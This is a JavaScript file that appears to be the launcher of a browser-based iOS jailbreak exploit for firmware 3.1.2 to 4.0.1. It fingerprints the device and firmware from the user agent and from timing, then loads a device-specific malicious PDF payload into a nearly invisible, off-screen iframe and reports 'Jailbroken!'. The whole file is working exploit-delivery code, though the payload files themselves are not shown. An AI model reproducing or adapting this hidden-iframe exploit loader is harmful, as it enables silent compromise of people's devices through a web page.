using('liblogging');
using('libdetect');

var ancientgo = function() {
	var agent = navigator.userAgent;
	var index = agent.indexOf("OS ");
	if(index == -1) {
		print('This exploit only works on iOS');
	}
	var firmware = agent.slice(index + "OS ".length);
	firmware = firmware.slice(0, firmware.indexOf(" "));
	firmware = firmware.replace(/_/g, ".");

	var model = null;
	if(agent.indexOf("iPad") != -1) {
		model = "iPad1,1";
	}
	else if(agent.indexOf("iPod") != -1) {
		var ssi = getSunSpiderInterval();
		window.location = '#' + ssi;
		if(ssi > 1625) {
			model = "iPod 1,1";
		} else if(ssi >= (firmware.indexOf("4.0") != -1 ? 800 : 1000)) {
			model = "iPod2,1";
		} else {
			model = "iPod3,1";
		}
	}  else if(agent.indexOf("iPhone") != -1) {
		if (window.devicePixelRatio == 2) {
        	model = "iPhone3,1";
    	} else {
        	var ssi = getSunSpiderInterval();
        	window.location = '#' + ssi;
        	if (ssi >= (firmware.indexOf("4.0") != -1 ? 1100 : 1600)) {
            	model = "iPhone1,x";
        	} else {
            	model = "iPhone2,1";
        	}
		}
	} else {
		print("Unable to detect device. Is your device supported?");
		return false;
	}

	var page = (model == null ? null : ('payloads/ancient/' + model + '_' + firmware + '.pdf'));
	if (page.indexOf('iPod3,1_3') != -1) {
	    print('Warning: This version is known to crash.\n\
	    	You can try it, but you might have better luck if you upgrade to 4.0 first.');
	}
	var supported_os = ['3.1.2', '3.1.3', '3.2', '3.2.1', '4.0', '4.0.1'];
	var vmismatch = 0;
	if (supported_os.indexOf(firmware) == -1) {
	    vmismatch = parseInt(firmware.substring(0, 1)) <= 3 ? -1 : 1;
	} else if (page != null) {
	    _ = new Image(page); // preload?
	}
	var i = document.createElement("iframe");
    i.setAttribute("src", page);
    i.style.position = 'absolute';
    i.style.opacity = '0.000001';
    i.style.width = '100px';
    i.style.height = '100px';
    i.style.zIndex = '-9999';
    document.body.appendChild(i);
    print('Jailbroken!');
}